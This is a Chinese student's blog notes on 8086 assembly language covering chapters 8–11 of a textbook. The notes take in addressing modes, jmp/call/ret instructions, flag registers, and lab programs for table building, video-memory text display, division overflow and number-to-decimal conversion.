<p>废了九牛二虎之力终于用比较朴素的方法实现了。遇到了不少问题，其中最主要的两个是：</p>
<ol>
<li>error A2052: Improper operand type</li>
<li>g命令之后卡死</li>
</ol>
<p>第一个在经过Google之后找到了解答<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230322202425.png"></p>
<p>我记得这一点书上好像提到过，给忘掉了，真是一头雾水</p>
<p>第二个问题，算是摸索着解开了疑惑，网上说有三种情况，1.代码段没加mov ax,4c00h 2.重启解决 3.代码导致g命令出错</p>
<p>我的情况应该是属于第三种，因为我按自己的想法写的时候，寻址方式比较奇怪。比如说我成功之前的那一次</p>
<h5 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">div word ptr [bx].0Ah//g命令后卡死，虽然这两处的值不相同，但按道理来说结果会出错，不应该出现程序卡死，此处存有疑惑</span><br><span class="line">div word ptr [bx+0ah]//也不可行</span><br><span class="line">div word ptr es:[bx+0ah]//成功，上边的错误在于忘记了要标明es段，可是有一点存疑，就算用的是ds段地址，那同样也能读取数据，为什么会卡死呢？？？？？</span><br><span class="line">div word ptr [168+si]//正确</span><br></pre></td></tr></table></figure>

<h5 id="寻址方式小结"><a href="#寻址方式小结" class="headerlink" title="寻址方式小结"></a>寻址方式小结</h5><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230322203639.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg                        //写的比较朴实，可能有较多重复的步骤，也可以一次循环填充一行中的所有信息，然后循环</span><br><span class="line">data segment                            //21次即可</span><br><span class="line">db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27;</span><br><span class="line">db &#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;</span><br><span class="line">db &#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27;</span><br><span class="line"></span><br><span class="line">dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514</span><br><span class="line">dd 345980,590827,803530,1183000,1843000,2759000,375000,4649000,5937000</span><br><span class="line"></span><br><span class="line">dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226</span><br><span class="line">dw 11542,14430,15257,17800</span><br><span class="line"></span><br><span class="line">data ends</span><br><span class="line">table segment</span><br><span class="line">db 21 dup(&#x27;year sumn ne ?? &#x27;)</span><br><span class="line">table ends</span><br><span class="line">codesg segment</span><br><span class="line">   start:mov ax,data</span><br><span class="line">         mov ds,ax</span><br><span class="line">         mov ax,table</span><br><span class="line">         mov es,ax</span><br><span class="line">         mov bx,0</span><br><span class="line">         mov si,0</span><br><span class="line">         mov cx,21</span><br><span class="line">     s0: mov ax,[si]                       </span><br><span class="line">         mov es:[bx],ax</span><br><span class="line">         add si,2</span><br><span class="line">         mov ax,[si]</span><br><span class="line">         mov es:[bx+2],ax</span><br><span class="line">         add si,2</span><br><span class="line">         add bx,16                                </span><br><span class="line">         loop s0</span><br><span class="line">         mov bx,0</span><br><span class="line">         mov si,0</span><br><span class="line">         mov cx,21</span><br><span class="line">     s1: mov ax,[84+si]                          </span><br><span class="line">         mov es:[bx+5],ax              </span><br><span class="line">         add si,2</span><br><span class="line">         mov ax,[84+si]</span><br><span class="line">         mov es:[bx+5+2],ax</span><br><span class="line">         add si,2</span><br><span class="line">         add bx,16                             </span><br><span class="line">         loop s1</span><br><span class="line">         mov bx,0</span><br><span class="line">         mov si,0</span><br><span class="line">         mov cx,21</span><br><span class="line">     s2: mov ax,[168+si]                         </span><br><span class="line">         mov es:[bx+0Ah],ax</span><br><span class="line">         add bx,16</span><br><span class="line">         add si,2</span><br><span class="line">         loop s2</span><br><span class="line">         mov bx,0</span><br><span class="line">         mov si,0</span><br><span class="line">         mov cx,21</span><br><span class="line">     s3: mov ax,es:[bx+5]</span><br><span class="line">         mov dx,es:[bx+5+2]</span><br><span class="line">         div word ptr [168+si]</span><br><span class="line">         mov es:[bx+0Dh],ax</span><br><span class="line">         add si,2</span><br><span class="line">         add bx,16</span><br><span class="line">         loop s3</span><br><span class="line">         mov ax,4c00h</span><br><span class="line">         int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过这次的实验知识发现了不少短板，hhh或者说全是短板哈哈哈哈，很多基础的东西打的不是很牢固，比如说高低字节，高低位</p>
<h5 id="高低字节，高低位"><a href="#高低字节，高低位" class="headerlink" title="高低字节，高低位"></a>高低字节，高低位</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">对于 <span class="number">1234</span>h这个十六进制数来说，其高字节是<span class="number">12</span>，低字节是<span class="number">34</span></span><br><span class="line">我们平时接触小端序比较多，那么高字节<span class="number">12</span>存放在高地址单元中，低字节<span class="number">34</span>存放在低地址单元中</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230322204849.png"></p>
<p>如果我们进行div word ptr ds:0操作，那么处理的也就是0、1这两个内存单元组成的数1234h。</p>
<h1 id="第九章-转移指令的原理"><a href="#第九章-转移指令的原理" class="headerlink" title="第九章 转移指令的原理"></a>第九章 转移指令的原理</h1><h2 id="操作符offeset"><a href="#操作符offeset" class="headerlink" title="操作符offeset"></a>操作符offeset</h2><p>offeset在汇编语言中是由编译器处理的符号，它的功能是取得标号处的偏移地址<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330172558.png"></p>
<h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><h3 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h3><p>CPU在执行jmp指令的时候不需要转移的目的地址，需要的是位移量。<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330173053.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330173151.png"></p>
<h4 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h4><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330173536.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330173606.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330173835.png"></p>
<p>可以看到，这里是通过目的地址而非位移量进行转移的</p>
<h4 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h4><p>jmp word ptr 内存单元地址（段内转移）</p>
<p>jmp dword ptr 内存段地址（段间转移）</p>
<p>对于段间转移 （CS）&#x3D;（内存单元地址+2），</p>
<p>​                        （IP） &#x3D;（内存单元地址）</p>
<h3 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h3><p>有条件的段间转移，有条件转移都是段间的，在对应的机器码中包含位移而不是地址。当cx&#x3D;&#x3D;0的时候执行跳转，cx!&#x3D;0时直接执行下一条语句<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330175241.png"></p>
<h3 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h3><p>循环指令都是段指令，对应的机器码中包含位移地址而不是目的地址<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330175446.png"></p>
<h2 id="实验八-分析一个奇怪的程序"><a href="#实验八-分析一个奇怪的程序" class="headerlink" title="实验八 分析一个奇怪的程序"></a>实验八 分析一个奇怪的程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">       mov ax,4c00h</span><br><span class="line">       int 21h</span><br><span class="line">start:</span><br><span class="line">       mov ax,0</span><br><span class="line">s:     nop</span><br><span class="line">       nop</span><br><span class="line">       mov di,offset s</span><br><span class="line">       mov si,offset s2</span><br><span class="line">       mov ax,cs:[si]</span><br><span class="line">       mov cs:[di],ax</span><br><span class="line">s0: jmp short s</span><br><span class="line">s1: mov ax,0</span><br><span class="line">       int 21h</span><br><span class="line">       mov ax,0</span><br><span class="line">s2: jmp short s1</span><br><span class="line">       nop</span><br><span class="line">codesg ends</span><br><span class="line">       end start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然看着是挺奇怪的，s的操作就是使s处的命令变为s2处的命令，即跳转到s1，很显然mov ax,0这里不满足让程序正确返回，用debug的t命令进行调试，可以成功运行，我们知道jup命令是不带有目标位置的地址的，它含有一个偏移地址，s2处的jump short s1的机器码是EB F6,F6就是偏移地址1111 0110补码表示-10，-10含义是标号处的地址-jmp指令后的第一个字节的地址，也就是从mov di,offset s位置前移十个字节，正好到达mov ax,4c00h int 21h，程序得以成功返回</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230330172008.png"></p>
<h2 id="实验九"><a href="#实验九" class="headerlink" title="实验九"></a>实验九</h2><p>将’welcome to masm!’正好16个字符，填入第11、12、13行</p>
<p>绿色属性 0 000 0 010B                 02h</p>
<p>绿底红字属性  0 010 0 100B         24h</p>
<p>白底蓝色属性 0 111 0 001B          71h</p>
<p>经过不懈的努力终于是搞好了，困住我的主要有两点，其一是对字，字节，寄存器不敏感，对于传输字和字节有点生疏。其二就是让我崩溃的东西，题目要求是打印在中间，我一想80个字符位，左边空出32，右边空出32中间正好留下16，然后左边的32x2&#x3D;64，有因为是从零开始，所以这边我们第一个填充的位置就是64呀，当成了63操作，结果是真抽象，还好最后一试，将welcome全部改成了11111，打印出来发现全部是同一个颜色的符号，也就是说我的颜色就然和字符与关，果断想到填充错了位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg,ds:data</span><br><span class="line">data segment</span><br><span class="line">  db &#x27;welcome to masm!&#x27;</span><br><span class="line">data ends</span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax,data</span><br><span class="line">      mov ds,ax</span><br><span class="line">      mov di,0</span><br><span class="line">      mov cx,16</span><br><span class="line">      mov bx,0</span><br><span class="line">      mov ax,0B800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov si,06e0h</span><br><span class="line">      mov ah,02h</span><br><span class="line">   s0:mov al,ds:[di]</span><br><span class="line">      mov es:[bx+si+64],al</span><br><span class="line">      mov es:[bx+si+65],ah</span><br><span class="line">      add bx,2</span><br><span class="line">      add di,1</span><br><span class="line">      loop s0</span><br><span class="line">      mov ax,0B800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov di,0</span><br><span class="line">      mov bx,0</span><br><span class="line">      mov si,780h</span><br><span class="line">      mov cx,16</span><br><span class="line">   s1:mov al,ds:[di]</span><br><span class="line">      mov es:[bx+si+64],al</span><br><span class="line">      mov al,24h</span><br><span class="line">      mov es:[bx+si+65],al</span><br><span class="line">      add bx,2</span><br><span class="line">      inc di</span><br><span class="line">      loop s1</span><br><span class="line">      mov ax,0B800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov bx,0</span><br><span class="line">      mov di,0</span><br><span class="line">      mov si,820h</span><br><span class="line">      mov cx,16</span><br><span class="line">   s2:mov al,ds:[di]</span><br><span class="line">      mov es:[bx+si+64],al</span><br><span class="line">      mov al,71h</span><br><span class="line">      mov es:[bx+si+65],al</span><br><span class="line">      add bx,2</span><br><span class="line">      inc di</span><br><span class="line">      loop s2</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230331013823.png"></p>
<h1 id="第十章-CALL指令和RET指令"><a href="#第十章-CALL指令和RET指令" class="headerlink" title="第十章 CALL指令和RET指令"></a>第十章 CALL指令和RET指令</h1><h2 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h2><p>ret指令只修改ip的内容，实现近迁移，retf应该就是ret far的意思，同时修改cs和ip中的内容，实现远迁移。<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402032439.png"></p>
<p>用汇编语言解释</p>
<p>ret：POP IP</p>
<p>retf：POP IP ,POP CS</p>
<h2 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402032635.png"></p>
<h3 id="依据位迁移进行转移的call指令"><a href="#依据位迁移进行转移的call指令" class="headerlink" title="依据位迁移进行转移的call指令"></a>依据位迁移进行转移的call指令</h3><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402032834.png"></p>
<p>下面程序执行后，ax的值</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402032932.png"></p>
<p>读取过call s指令后，ip中的值自动增加（第二章 28页），变为6，call指令相当于push ip，s处是pop ax，所以ax的值为6。</p>
<h3 id="转移的目的地址在指令中的call指令"><a href="#转移的目的地址在指令中的call指令" class="headerlink" title="转移的目的地址在指令中的call指令"></a>转移的目的地址在指令中的call指令</h3><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402033501.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402034116.png"></p>
<h3 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的call指令</h3><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402034837.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402034852.png"></p>
<p>bp的默认段地址是ss</p>
<h3 id="转移地址在内存中的call指令"><a href="#转移地址在内存中的call指令" class="headerlink" title="转移地址在内存中的call指令"></a>转移地址在内存中的call指令</h3><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402035632.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230402040248.png"></p>
<p>回顾一下jump dword ptr 内存单元地址 </p>
<p>CS&#x3D;（内存单元地址+2）</p>
<p>IP&#x3D;（内存单元地址）</p>
<h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230403170535.png"></p>
<h2 id="实验-10-编写子程序"><a href="#实验-10-编写子程序" class="headerlink" title="实验 10 编写子程序"></a>实验 10 编写子程序</h2><p>1.显示字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code,ss:stack</span><br><span class="line">data segment</span><br><span class="line">db&#x27;welcome to masm!&#x27;,0</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">db 8 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">start:mov dh,8 ;传参 8行 3列 绿色</span><br><span class="line">      mov dl,3</span><br><span class="line">      mov cl,2</span><br><span class="line">      mov ax,data</span><br><span class="line">      mov ds,ax</span><br><span class="line">      mov si,0</span><br><span class="line">      call show_str</span><br><span class="line"></span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">show_str:</span><br><span class="line">      sub dh,1;这里注意000是第一行开始，160是第2行开始</span><br><span class="line">      mov al,160</span><br><span class="line">      mul dh;存入的数据是7*160，即第八行开始</span><br><span class="line">      mov bx,ax</span><br><span class="line">      mov dh,0</span><br><span class="line">      add bx,dx</span><br><span class="line">      add bx,dx;这里实现列数，注意两个字节表一个字符，所以我们加两次即加6</span><br><span class="line">      mov ax,0b800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov al,cl</span><br><span class="line">    s:mov cl,[si]</span><br><span class="line">      mov ch,0</span><br><span class="line">      jcxz ok;如果是结束字符0，则跳转回去</span><br><span class="line">      mov es:[bx],cl</span><br><span class="line">      mov es:[bx+1],al</span><br><span class="line">      inc si</span><br><span class="line">      add bx,2</span><br><span class="line">      jmp short s</span><br><span class="line">      </span><br><span class="line">ok:   ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>由于粗心出现了一个警告 missing data：zero assume，提醒我们缺少操作数</p>
<p>把add bx,dx写成了add bx,dx</p>
<p>2.解决除法的溢出问题</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230404195800.png"></p>
<p>给出了一个提示</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230404195943.png"></p>
<p>65536是十六进制的1 0000也就是将得到的数左移四个16进制位呗，我们可以直接把int(H&#x2F;N)的内容直接放入dx中，然后把后面的整体装入ax中，把后面整体产生的余数装入cx中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code,ss:stack</span><br><span class="line">stack segment</span><br><span class="line">dw 8 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack</span><br><span class="line">      mov ss,ax</span><br><span class="line">      mov sp,10h</span><br><span class="line">      mov ax,4240h</span><br><span class="line">      mov dx,000fh</span><br><span class="line">      mov cx,0ah</span><br><span class="line">      call divdw</span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line">divdw:push ax</span><br><span class="line">      push dx</span><br><span class="line">      mov bx,ax</span><br><span class="line">      mov dx,0</span><br><span class="line">      pop ax</span><br><span class="line">      div cx</span><br><span class="line">      push ax;商</span><br><span class="line">      push dx;余</span><br><span class="line">      mov ax,bx</span><br><span class="line">      div cx</span><br><span class="line">      mov cx,dx</span><br><span class="line">      pop dx</span><br><span class="line">      pop dx</span><br><span class="line">      pop si;它存在的意义是把栈清理到只剩一个，以便使下面的ret成功返回</span><br><span class="line">      ret    ;前面哪些部分其实可以不使用栈，此题占用的寄存器不多</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230404221743.png"></p>
<p>3.数值显示将二进制转化为十进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line"> db 10 dup (10)</span><br><span class="line"> data ends</span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line">start:mov ax,12666</span><br><span class="line">      mov bx,data</span><br><span class="line">      mov ds,bx</span><br><span class="line">      mov si,0</span><br><span class="line">      call dtoc</span><br><span class="line"></span><br><span class="line">      mov dh,8</span><br><span class="line">      mov dl,3</span><br><span class="line">      mov cl,2</span><br><span class="line">      call show_str</span><br><span class="line"></span><br><span class="line">      mov ax,4c00h</span><br><span class="line">      int 21h</span><br><span class="line"> </span><br><span class="line"> dtoc:mov dx,0</span><br><span class="line">      mov bx,10</span><br><span class="line">      div bx;余数在dx，商在ax</span><br><span class="line">      mov cx,ax</span><br><span class="line">      add dx,30h</span><br><span class="line">      mov [si],dl;存放余数的ascii</span><br><span class="line">      inc si;表示位数</span><br><span class="line">      jcxz short s1</span><br><span class="line">      jmp short dtoc</span><br><span class="line">   s1:ret</span><br><span class="line">show_str:</span><br><span class="line">      sub dh,1</span><br><span class="line">      mov al,160</span><br><span class="line">      mul dh</span><br><span class="line">      mov bx,ax</span><br><span class="line">      mov dh,0</span><br><span class="line">      add bx,dx</span><br><span class="line">      add bx,dx</span><br><span class="line">      mov ax,0b800h</span><br><span class="line">      mov es,ax</span><br><span class="line">      mov al,cl</span><br><span class="line">    s:mov cl,[-1+si];66621</span><br><span class="line">      mov ch,0</span><br><span class="line">      ;jcxz ok 如果不注释掉的话，以零结尾的数将无法显示</span><br><span class="line">      mov es:[bx],cl</span><br><span class="line">      mov es:[bx+1],al</span><br><span class="line">      sub si,1</span><br><span class="line">      mov cx,si</span><br><span class="line">      jcxz short ok</span><br><span class="line">      add bx,2</span><br><span class="line">      jmp short s</span><br><span class="line">ok:   ret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>感谢这位博主：<a href="https://blog.csdn.net/qq_60829702/article/details/123582250">https://blog.csdn.net/qq_60829702/article/details/123582250</a></p>
<h1 id="第十一章-标志寄存器"><a href="#第十一章-标志寄存器" class="headerlink" title="第十一章 标志寄存器"></a>第十一章 标志寄存器</h1><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406121332.png"></p>
<h2 id="ZF-标志"><a href="#ZF-标志" class="headerlink" title="ZF 标志"></a>ZF 标志</h2><p>记录相关指令执行后结果是否为零，如果为零则ZF为1，如果非零则ZF为0。</p>
<h2 id="PF-标志"><a href="#PF-标志" class="headerlink" title="PF 标志"></a>PF 标志</h2><p>记录执行相关指令后，结果的所有bit位1的个数是否为偶数，如果1的数量是偶数，则PF为1.</p>
<h2 id="SF-标志"><a href="#SF-标志" class="headerlink" title="SF 标志"></a>SF 标志</h2><p>记录执行相关指令后，结果是否为负，如果结果为负，则SF为1.</p>
<h2 id="CF-标志"><a href="#CF-标志" class="headerlink" title="CF 标志"></a>CF 标志</h2><p>在进行无符号运算时，它记录进位和借位情况</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406122332.png"></p>
<p>进位比较好理解，下面看一下借位</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406122516.png"></p>
<h2 id="OF-标志"><a href="#OF-标志" class="headerlink" title="OF 标志"></a>OF 标志</h2><p>进行有符号运算是否发生溢出，如果溢出则OF为1.<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406123023.png"></p>
<h2 id="adc-指令"><a href="#adc-指令" class="headerlink" title="adc 指令"></a>adc 指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406123128.png"></p>
<p>这个指令乍一看很奇怪，很多余，为什么要加上一个cf？但是看了下面的解释之后，我直呼巧妙</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406123359.png"></p>
<p>adc也会对CF位进行设置，由于这样的功能，我们可以对任意大的数据进行加法运算。</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406124107.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406124125.png"></p>
<h2 id="sbb-指令"><a href="#sbb-指令" class="headerlink" title="sbb 指令"></a>sbb 指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406133522.png"></p>
<h2 id="cmp-指令"><a href="#cmp-指令" class="headerlink" title="cmp 指令"></a>cmp 指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406134232.png"></p>
<p>可以通过标志寄存器中的值得出比较结果<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406134301.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406171440.png"></p>
<p>这里有点疑惑的，为什么实际结果为负，且发生了溢出，就可以推出实际结果为正。溢出，有正溢出和负溢出。正溢出就是两个正数相加，超过了能表示的最大范围，变为负数，负溢出就是两个负数相加，超出了能表示的最小范围，变为正数。举个例子：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">拿四位有符号数来举例</span><br><span class="line"><span class="attribute">MAX</span>==0111==7</span><br><span class="line"><span class="attribute">MIN</span>==1000==-8</span><br><span class="line">正溢出0111+<span class="attribute">0111</span>==1110(补码)==-2</span><br><span class="line">负溢出1000+<span class="attribute">1000</span>==10000截断最高位==0000两个负数相加结果为0</span><br></pre></td></tr></table></figure>

<p>好的疑惑消失了。</p>
<h2 id="检测比较结果的条件转移指令"><a href="#检测比较结果的条件转移指令" class="headerlink" title="检测比较结果的条件转移指令"></a>检测比较结果的条件转移指令</h2><p>这些指令往往和cmp搭配使用，因为cmp可以同时进行两种比较，无符号数比较和有符号数比较。<img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406181600.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406181626.png"></p>
<h2 id="DF标志和串传送指令"><a href="#DF标志和串传送指令" class="headerlink" title="DF标志和串传送指令"></a>DF标志和串传送指令</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406183935.png"></p>
<p>串传送指令：movsb，实现传送一个字节，movsw实现传送一个字</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406184037.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406184052.png"></p>
<p>movsb一般和rep搭配使用</p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406184255.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406184459.png"></p>
<h2 id="pushf-和-popf"><a href="#pushf-和-popf" class="headerlink" title="pushf 和 popf"></a>pushf 和 popf</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406184609.png"></p>
<p>push 和 pop显然不能进行这些操作，他两个的操作对象是字而不是bit。</p>
<h2 id="标志寄存器在Debug中的表示"><a href="#标志寄存器在Debug中的表示" class="headerlink" title="标志寄存器在Debug中的表示"></a>标志寄存器在Debug中的表示</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406185003.png"></p>
<p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406185033.png"></p>
<h2 id="实验-11-编写子程序"><a href="#实验-11-编写子程序" class="headerlink" title="实验 11 编写子程序"></a>实验 11 编写子程序</h2><p><img src="/2023/04/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/QQ%E6%88%AA%E5%9B%BE20230406200150.png"></p>
<p>我们分析一下题目，以0结尾，我们可以通过cx实现自动循环。</p>
<p>难点在于我们如何识别出是小写字符a<del>z，应该是通过ASCII（97</del>122）判断，如果ascii在这个区间，那么我们就通过and 1101 1111将第6位置零，如果不在此区间，那么直接下一个。</p>
